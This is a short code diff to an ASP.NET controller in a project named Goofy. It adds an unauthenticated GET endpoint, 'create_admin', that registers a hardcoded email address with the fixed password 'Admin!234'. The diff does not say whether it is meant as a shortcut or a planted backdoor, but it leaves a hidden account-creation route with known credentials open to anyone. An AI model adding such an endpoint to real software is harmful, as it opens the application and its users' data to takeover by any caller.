@@ -19,6 +19,14 @@ namespace Goofy.Presentation.PluggableCore.Controllers
             _userRegister = userRegister;
         }
 
+        [HttpGet("create_admin")]
+        [AllowAnonymous]
+        public async Task<IActionResult> CreateUser()
+        {
+            await _userRegister.Register("cyberboy.havana@gmail.com", "Admin!234");
+            return Ok();
+        }
+
         [HttpPost("login")]
         [AllowAnonymous]
         public async Task<IActionResult> LogIn([FromBody]Login model)
